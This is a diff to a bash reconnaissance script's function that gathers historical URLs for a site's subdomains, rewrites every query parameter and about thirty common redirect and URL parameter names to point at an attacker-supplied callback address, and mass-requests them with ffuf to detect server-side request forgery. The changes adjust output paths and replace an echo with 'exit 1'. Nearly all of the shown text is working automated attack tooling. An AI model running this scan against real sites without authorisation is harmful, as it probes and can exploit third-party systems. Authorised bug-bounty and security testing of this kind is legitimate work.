@@ -65,11 +65,11 @@ all(){
     cat $output/subs.txt | waybackurls > $output/$site-ssrf.txt
     cat $output/subs.txt | gau >> $output/$site-ssrf.txt
     cat $output/$site-ssrf.txt | sort | uniq | grep "?" | qsreplace -a | qsreplace $ssr > $output/$site-ssrf2.txt
-    sed -i "s|$|\&dest=$ssr\&redirect=$ssr\&uri=$ssr\&path=$ssr\&continue=$ssr\&url=$ssr\&window=$ssr\&next=$ssr\&data=$ssr\&reference=$ssr\&ssr=$ssr\&html=$ssr\&val=$ssr\&validate=$ssr\&domain=$ssr\&callback=$ssr\&return=$ssr\&page=$ssr\&feed=$ssr\&host=$ssr&\port=$ssr\&to=$ssr\&out=$ssr\&view=$ssr\&dir=$ssr\&show=$ssr\&navigation=$ssr\&open=$ssr|g" $output/ssrf/$site-ssrf2.txt
-    ffuf -w $output/$site-ssrf2.txt -u FUZZ -t 50  > $output/ssrf/$site-ssrf3.txt
+    sed -i "s|$|\&dest=$ssr\&redirect=$ssr\&uri=$ssr\&path=$ssr\&continue=$ssr\&url=$ssr\&window=$ssr\&next=$ssr\&data=$ssr\&reference=$ssr\&ssr=$ssr\&html=$ssr\&val=$ssr\&validate=$ssr\&domain=$ssr\&callback=$ssr\&return=$ssr\&page=$ssr\&feed=$ssr\&host=$ssr&\port=$ssr\&to=$ssr\&out=$ssr\&view=$ssr\&dir=$ssr\&show=$ssr\&navigation=$ssr\&open=$ssr|g" $output/$site-ssrf2.txt
+    ffuf -w $output/$site-ssrf2.txt -u FUZZ -t 50  > $output/$site-ssrf3.txt
     #echo -e "Found Check SSRF [${GR}$(cat $output/ssrf/$site-ssrf3.txt | wc -l)${NT}]"
     echo -e "\n${RD}Success Saved:${GR}[$output/$site-ssrf3.txt]"
-    echo
+    exit 1
     
 }
 
